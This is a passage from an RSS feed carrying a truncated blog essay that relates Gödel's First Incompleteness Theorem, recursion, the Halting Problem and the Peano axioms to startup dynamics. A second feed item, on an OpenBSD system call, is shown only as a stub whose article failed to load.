<p><img src="http://dgn0b0vubo9qr.cloudfront.net/wp-content/uploads/2013/01/math.png" alt="" width="150" srcset="https://skibinsky.com/wp-content/uploads/2013/01/math.png 263w, https://skibinsky.com/wp-content/uploads/2013/01/math-150x150.png 150w" sizes="(max-width: 263px) 100vw, 263px">Human patterns emerge from our personal traits. Weather a startup will overcome its human-related challenge is determined by what a person or a team can succeed or fail at. The telltale sign is when the outcome will be determined by quality or quantity of personal efforts. What you typically read in Silicon Valley startup blogs would be all about such human patterns. It will be hundreds of topics covering which software language to use, how to pick founders, how to operate the company, how to build a product, how to build software, what is company culture etc. It’s all good content, yet it only addresses patterns driven by human traits, and thus is only half of the equation.</p>
<p>What you rarely hear about is “mathematical” patterns. These patterns emerge from objective nature of the reality where a startup must operate. The market dynamics, the ecosystem of industries they find themselves in, the governing trends of technological progress. As soon as a startup starts operating in the real world, the vast majority of factors will be outside of a startup direct control or even influence, while having absolutely dominating impact on that startup eventual outcome. Beside now legendary <a href="http://www.amazon.com/Black-Swan-Improbable-Robustness-Fragility/dp/081297381X" target="_blank" rel="noopener noreferrer">Black Swan</a><a href="#footnote-1" id="refmark-1"><sup>1</sup></a> making big waves since 2006, there is almost no information on the mathematical fundamentals of startup formation and investing. Usually all you get is a non-actionable statement like “<i>90% of all startups fail</i>” after which the author promptly moves back to human factors, which are much easier to understand and analyze.</p>
<p>To help develop our mathematical intuition we will turn to one of the most profound mathematical results, provided by the legendary <a href="http://en.wikipedia.org/wiki/Kurt_G%C3%B6del">Kurt Gödel</a>: <b>The First Incompleteness Theorem</b>. To most it is a seemingly dry statement on the <i>completeness</i> and <i>consistency</i> of <i>formal systems</i>. On a deeper level, however, there is an interesting commonality between the mathematics of incompleteness and startup disruption. It’s critical to understanding the dynamics how startups get born, get big or fail, and finally how the few survivors become legacy companies. Showing this deep connection between mathematics of incompleteness of formal systems and startups will be the purpose of this essay.</p>

<blockquote><p>“[My] own work no longer means much, I came to the Institute merely…to have the privilege of walking home with Gödel.”</p>
<p><em>Albert Einstein</em></p>
</blockquote>
<div id="attachment_839"><p><img aria-describedby="caption-attachment-839" src="http://dgn0b0vubo9qr.cloudfront.net/wp-content/uploads/2013/01/gande-150x150.jpg" alt="" width="150" height="150"></p><p id="caption-attachment-839">Albert Einstein and Kurt Godel taking a walk.</p></div>
<p>It is surprising that Gödel’s famous theorem is all but unknown in the startup world. Thinking&nbsp; of all the mathematical knowledge that has direct impact on computer science, software and startups I would be hard pressed to come up with anything more powerful than Gödel’s <i>Incompleteness Theorem</i>.</p>
<p><a href="http://ycombinator.com/" target="_blank" rel="noopener noreferrer">Y Combinator</a> is famously named after <a href="http://en.wikipedia.org/wiki/Fixed-point_combinator" target="_blank" rel="noopener noreferrer">Y Combinator</a>, one of the best-known fixed-point combinators used to construct certain recursive functions. Yet who was the first to define and use a recursive functions? Gödel. Further, the proof that fixed points exist at all is a <a href="http://en.wikipedia.org/wiki/Diagonal_lemma" target="_blank" rel="noopener noreferrer">side effect</a> implicit of his work. Y Combinator is direct descendant<a href="#footnote-2" id="refmark-2"><sup>2</sup></a> of Gödel’s proof.</p>
<p><img src="http://dgn0b0vubo9qr.cloudfront.net/wp-content/uploads/2013/01/turing-150x150.png" width="150" height="150"></p>
<p>Consider another cornerstone of computer science, such as Alan Turing’s <a href="http://en.wikipedia.org/wiki/Halting_problem" target="_blank" rel="noopener noreferrer">Halting Problem</a>. He created that theorem when working at Princeton, right at the time when discussions about Gödel recent results dominated the institute mathematical debates. Turing’s proof is a continuation of Gödel’s work<a href="#footnote-3" id="refmark-3"><sup>3</sup></a>. Kleene, Turing and Shannon were all standing on the shoulders of the giant – gnome sized Gödel – when they were following his groundbreaking proof and inventing modern computer science. We will review Halting Problem in more details later in this essay.</p>
<p>When you truly grasp the implications of what Gödel actually proved, it will be like opening a Pandora’s box&nbsp; of wonderful insights. The implications of the theorem go far beyond just logic and math. Answers to the most sought after questions such as: <em>Why can everything be made better? Why are so many startups possible and will always be possible? Why things we build tend to get more complex over time? Why does civilization always has room to improve?</em></p>
<p>To answers these questions, and &nbsp;see how all these things are connected mathematically you need to understand Gödel incompleteness.</p>
<h2>A taste of things to come</h2>
<p>Naturally, there is a reason why Gödel theorem is still relatively unknown outside of mathematical circles. There are few big problems. First of all, <a href="http://www.research.ibm.com/people/h/hirzel/papers/canon00-goedel.pdf#page=2" target="_blank" rel="noopener noreferrer">Gödel’s proof</a> is <b>hard</b>. Not “<i>learn new computer language</i>” hard, not “<i>make an iPhone game</i>” hard, really, really, <b>really hard</b>. Gödel did not make the task of understanding his theorems easy. Being famously introverted, he preferred the logic of his proofs to do all his speaking for him. Even mathematical education is not much help here. For example, Gödel offers the following preview, a “sketch proof”, what he called an “<i>an intuition</i>” for the real proof to follow.</p>
<blockquote><p>We will define a class <b>K</b> of natural numbers as follows: <b>K</b> = { <i>n</i> ∈ IN | ¬ <i>provable(R<b><sub>n</sub></b>(n)) </i>}&nbsp;(where <i>provable(x)</i> means x is a provable formula). K is the set of numbers <i>n</i> where the formula <i>R<b><sub>n</sub></b>(n) </i>that you get when you insert <i>n</i> into its own formula <i>R<b><sub>n</sub></b></i> is improvable. Since all the concepts used for this definition are themselves definable in PM, so is the compound concept <b>K</b>, i.e. there is a class-sign S such that the formula S(n) states that n∈<b>K</b>. As a class-sign, S is identical with a specific <i>R<b><sub>q</sub></b></i>, i.e. we have S ⇔ <i>R<b><sub>q</sub></b></i>&nbsp;for a specific natural number <strong>q</strong>. We will now prove that the theorem <i>R<b><sub>q</sub></b>(q)</i> is undecidable within PM. We can understand this by simply plugging in the&nbsp;definitions:&nbsp;<i>R<b><sub>q</sub></b>(q)</i> ⇔ <i>S(q)</i> ⇔q ∈ K⇔<b> ¬</b><i>(R<b><sub>q</sub></b>(q))</i>, in other words, <i>R<b><sub>q</sub></b>(q)</i> states “<i>I am improvable.</i>“</p></blockquote>
<p>Unless you are an active mathematician, reading and intuitively understanding his proof would be next to impossible. Just in case here is the <a href="http://www.research.ibm.com/people/h/hirzel/papers/canon00-goedel.pdf#page=1" target="_blank" rel="noopener noreferrer">proof again</a> in case you enjoy sharpening your mathematical teeth against this amazing whetstone of logic<a href="#footnote-4" id="refmark-4"><sup>4</sup></a>.</p>
<p>The second, even bigger problem is that understanding the proof will not help you much. Gödel’s logic is so alien, so strange that even understanding the formal deductions won’t help you understand all the implications of that phenomenon. Gödel’s proof is like a map with “<i>X marks the spot</i>”, yet on that map every border connecting it with our reality is torn away. You have no idea what particular area that map refers to. X is there, treasure is certainly there, but how the heck do you <b>practically </b>use it? In ironic self-referential self-validation Gödel’s formal proof cannot be understood formally. It requires an intuition leap that will unlock its secrets. And after you make that leap your perspective on everything related to startups and innovations will change. That is the insight we will try to develop<a href="#footnote-5" id="refmark-5"><sup>5</sup></a>.</p>
<h2>The Theorem</h2>
<blockquote><p>Gödel’s theorem is rapidly becoming accepted as being the fundamental contribution to the foundation of&nbsp; mathematics – probably the <b>most fundamental</b> ever to be found.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="http://en.wikipedia.org/wiki/Roger_Penrose" target="_blank" rel="noopener noreferrer">Roger Penrose</a></p>
</blockquote>
<p>What exactly has Gödel proving? In modern language, simplified statement will be the following:</p>
<blockquote><p>Any … <strong><em>formal system</em></strong> capable of expressing elementary arithmetic cannot be both <strong><em>consistent</em></strong> and <strong><em>complete</em></strong>. In particular, for any consistent, … formal system that proves certain basic arithmetic truths, there is an arithmetical statement that is <strong><em>true, but not provable</em></strong> in theory</p></blockquote>
<p>Let’s work our way through that, since most of the concepts here are actually fairly easy to understand.</p>
<p><strong><em>Formal systems</em></strong> are simple things. They are just collections of <b>axioms</b> and <b>rules</b> on how to manipulate them. For example, lets make a few axioms about numbers:</p>
<ul>
<li>The number 0 exists</li>
<li>Each number has a successor that is a number. One follows zero, two follows one, etc.</li>
<li>Two different numbers can not have the same successor</li>
<li>… more axioms if you wish …</li>
</ul>
<div id="attachment_184"><p><img aria-describedby="caption-attachment-184" src="http://dgn0b0vubo9qr.cloudfront.net/wp-content/uploads/2013/01/peano.png" alt="" width="136" height="213"></p><p id="caption-attachment-184">Giuseppe Peano</p></div>
<p>If we continue writing down such “self evident” axioms, we can arrive at certain set of axioms, called <a href="http://en.wikipedia.org/wiki/Peano_axioms" target="_blank" rel="noopener noreferrer">Peano axioms</a>. These axioms and few rules of manipulations would constitute the simple arithmetic you learned in kindergarten if not earlier.</p>
<p>Axioms and rules about how axioms can be manipulated to produce derived statements is what constitute a <i>formal system</i>. Systems can be very different from each other. You …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://skibinsky.com/godel-incompleteness-for-startups/">https://skibinsky.com/godel-incompleteness-for-startups/</a></em></p>]]>
            </description>
            <link>https://skibinsky.com/godel-incompleteness-for-startups/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23687846</guid>
            <pubDate>Tue, 30 Jun 2020 08:07:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Implementing a System Call for OpenBSD]]>
            </title>
            <description>
<![CDATA[
Score 96 | Comments 29 (<a href="https://news.ycombinator.com/item?id=23685279">thread link</a>) | @soheilpro
<br/>
June 29, 2020 | https://poolp.org/drafts/2020-05-28-015100-copy/ | <a href="https://web.archive.org/web/*/https://poolp.org/drafts/2020-05-28-015100-copy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://poolp.org/drafts/2020-05-28-015100-copy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23685279</guid>
            <pubDate>Tue, 30 Jun 2020 00:43:32 GMT</pubDate>
        </item>
    </channel>
</rss>
